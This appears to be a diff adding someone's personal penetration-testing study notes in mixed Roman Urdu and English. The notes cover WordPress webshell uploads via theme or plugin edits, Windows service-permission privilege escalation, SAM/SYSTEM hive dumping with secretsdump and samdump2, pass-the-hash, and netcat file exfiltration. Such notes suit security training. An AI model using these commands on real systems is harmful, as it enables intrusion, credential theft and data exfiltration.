@@ -1,0 +1,115 @@
+open-relay : kissi or ka server istamal krke apna email send kro
+agar sirf url mille to wo blackbox
+SMB ke 3 trha ke auth 
+
+Wordpress me login hone ke bad 2 ways se hum  callback leskte
+wordpress me do  limitation hai hum directory triverse nhi krskte in server
+webshell me sudo nhi istemal krskte
+theme ki file ko edit kia or run krwadia
+yahan humne 404 ko edit kia
+
+
+method 1 : By changing contents of page 
+
+KAlI me by default webserver me 
+cd /user/share/webshells  
+
+or 
+on google => pentestmonkey reverse shell 
+sare shells mil jayenge
+or github php rev. shell
+
+method 2: By adding a new plugin
+
+use metasploit to automate or do it manually
+search "wordpress admin" (in metasploit)
+(wp-admin shell upload)
+
+
+
+*********************************************************
+
+Priv excilation in windows
+
+vuln name => insecure service permission
+steps:
+list all services running
+=> sc query
+
+=> sc qc 'service name'
+to change binary path
+=> sc config "ServiceName" binpath="path/myexe"
+sometime access denied
+
+whoami /priv
+sc start 'service name'
+agar path ko hijack nhi krskte to hum path hi change krdenge
+
+listner
+nc -lnvp 'portno'
+
+cmd => icacls(check privilages in current dir)
+
+by default nhi hoten jab ab koi solutions install krte tb ye vuln ate registry me user ko writable permissions hoten
+
+2nd vuln 
+=> sc qc unquotedsvc 
+
+
+exploit db priv escilation windows
+3 files access kro registery se  unme sam security  system
+ye files sirf local admin dump krskta
+
+host se apne pass files lana hai to phele netcat ko upload kro
+windows=> nc.exe -w 3 'ip' 'port' < fielname 
+linux=> nc -lnvp 'port' > 'filename'
+
+agar hum mimikatz ko wahan na bhej paye to hum apne pass ye run krnge
+impackets-seceretsdump -sam sam -security security -system system targetpcname
+
+kali me samdump2 
+=> samdump2 system sam
+
+sare users ke 2 hash hain ik sb ka same hota or second sb ka change hota
+agar hum direct hash hi pass kren to wo bhi authenticate hojayega or wo attack "PASS THE HASH" khelata
+
+
+apne pass kali me
+---python3 -m http.server
+target pr
+curl http://kali ki ip/filename -o filename
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
